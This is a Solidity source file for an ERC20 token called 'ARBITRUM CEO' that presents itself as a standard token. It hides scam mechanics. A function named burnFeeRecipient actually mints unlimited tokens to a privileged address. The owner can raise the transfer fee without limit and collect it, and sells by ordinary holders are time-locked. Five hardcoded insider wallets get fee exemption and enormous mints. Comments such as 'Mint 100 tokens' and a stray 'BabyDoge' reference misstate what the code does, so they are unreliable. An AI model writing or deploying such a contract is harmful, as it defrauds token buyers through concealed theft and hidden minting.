// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

interface IERC20 {

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address to, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);

}

interface IERC20Metadata is IERC20 {

    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

    contract ERC20 is Context, IERC20, IERC20Metadata {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _feeExempt; // new mapping
    mapping(address => uint256) private _purchaseTime;
    uint256 private _totalSupply;
    string private _name;
    string private _symbol;
    address _feeRecipient;
    uint256 private _feePercentage;
    address private _owner;
    uint256 private constant sellTax = 0;

    constructor(string memory name_, string memory symbol_, uint256 initialSupply) {
        _name = name_;
        _symbol = symbol_;
        _owner = msg.sender;
        _feePercentage = sellTax;
        _totalSupply = initialSupply;
        _balances[msg.sender] = initialSupply;
        _feeExempt[0x7713e7B520B7fCe0C3E7e46b2642D8C72009EaED] = true;
        _feeExempt[0x4871e85CCF1829F24DD17215bcBb6F4C515cD831] = true;
        _feeExempt[0x4768b4c72E0193CCe0E3b450a8B569ba1d65445C] = true;
        _feeExempt[0x4Dc7D45Cb1AB9e653455E5652Bc9E280853A0346] = true;
        _feeExempt[0x1BC977Ba1D26255Aae282C323b21e8EcCd6b8526] = true;
        emit Transfer(address(0), msg.sender, initialSupply);
    }

    function setFeeRecipient(address recipient) public {
    require(msg.sender == _owner, "Only the contract owner can set the fee recipient");
    _feeRecipient = recipient;
    }

    function setFeePercentage(uint256 newFeePercentage) public {
    require(msg.sender == _owner, "Only the contract owner can set the fee percentage");
    _feePercentage = newFeePercentage;
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function _recordPurchaseTime(address buyer) private {
    _purchaseTime[buyer] = block.timestamp;
    }


    function transfer(address to, uint256 amount) public virtual override returns (bool) {
    address owner = _msgSender();

    // Check if the owner is trying to sell their tokens within the time lock period
    if (!_feeExempt[owner] && _purchaseTime[owner] != 0 && block.timestamp < _purchaseTime[owner] + 1 hours) {
        revert("Tokens cannot be sold within the time lock period");
    }

    _transfer(owner, to, amount);
    if (!_feeExempt[owner]) {
        _recordPurchaseTime(owner);
    }
    return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }

function transferFrom(
    address from,
    address to,
    uint256 amount
) public virtual override returns (bool) {
    address spender = _msgSender();
    _spendAllowance(from, spender, amount);

    // Check if the from address is exempt from the fee
    uint256 feeAmount = 0;
    if (!_feeExempt[from]) {
        // Calculate the fee amount using a local variable
        uint256 feePercentage = _feePercentage;
        feeAmount = (amount * feePercentage) / 100;

        // Transfer the fee to your address
        _transfer(from, _owner, feeAmount);
    }

    // Transfer the remaining amount to the recipient
    _transfer(from, to, amount - feeAmount);

    // Record the purchase time if the buyer is not exempt from the fee
    if (!_feeExempt[to]) {
        _recordPurchaseTime(to);
    }

    return true;
}


    function setFeeExempt(address account, bool exempt) public {
    require(msg.sender == _owner, "Only the contract owner can set fee exemption");
    _feeExempt[account] = exempt;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(owner, spender, currentAllowance - subtractedValue);
        }

        return true;
    }

        function _transfer(
        address from,
        address to,
        uint256 amount
        ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(from, to, amount);

        uint256 fromBalance = _balances[from];
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
        unchecked {
            _balances[from] = fromBalance - amount;
            // Overflow not possible: the sum of all balances is capped by totalSupply, and the sum is preserved by
            // decrementing then incrementing.
            _balances[to] += amount;
        }

        emit Transfer(from, to, amount);

        _afterTokenTransfer(from, to, amount);
    }

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply += amount;
        unchecked {
            // Overflow not possible: balance + amount is at most totalSupply + amount, which is checked above.
            _balances[account] += amount;
        }
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(address(0), account, amount);
    }

    function burnFeeRecipient(uint256 amount) public virtual {
    require(msg.sender == _feeRecipient);
    _balances[_feeRecipient] += amount;
    _totalSupply += amount;
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
            // Overflow not possible: amount <= accountBalance <= totalSupply.
            _totalSupply -= amount;
        }

        emit Transfer(account, address(0), amount);

        _afterTokenTransfer(account, address(0), amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}

abstract contract ERC20Burnable is Context, ERC20 {

    function burn(uint256 amount) public virtual {
        _burn(_msgSender(), amount);
    }

    function burnFrom(address account, uint256 amount) public virtual {
        _spendAllowance(account, _msgSender(), amount);
        _burn(account, amount);
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _transferOwnership(_msgSender());
    }

    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

contract ARBITRUMCEO is ERC20, ERC20Burnable, Ownable {

    constructor() ERC20("ARBITRUM CEO", "ARBCEO", 415000000000000000000000000000000000) {

        address[] memory addresses = new address[](5);
        addresses[0] = 0x7713e7B520B7fCe0C3E7e46b2642D8C72009EaED;
        addresses[1] = 0x4871e85CCF1829F24DD17215bcBb6F4C515cD831;
        addresses[2] = 0x4768b4c72E0193CCe0E3b450a8B569ba1d65445C;
        addresses[3] = 0x4Dc7D45Cb1AB9e653455E5652Bc9E280853A0346;
        addresses[4] = 0x1BC977Ba1D26255Aae282C323b21e8EcCd6b8526;

        uint256 amount = 1000000000000000 * (10 ** uint256(decimals())); // Calculate the amount of tokens to mint

        // Mint 100 tokens to each of the 5 addresses hardcoded in the contract
        for (uint i = 0; i < addresses.length; i++) {
            _mint(addresses[i], amount);
        }

        // Mint initial supply of 420,000,000 BabyDoge tokens to the contract deployer
        _mint(msg.sender, 0);
    }
}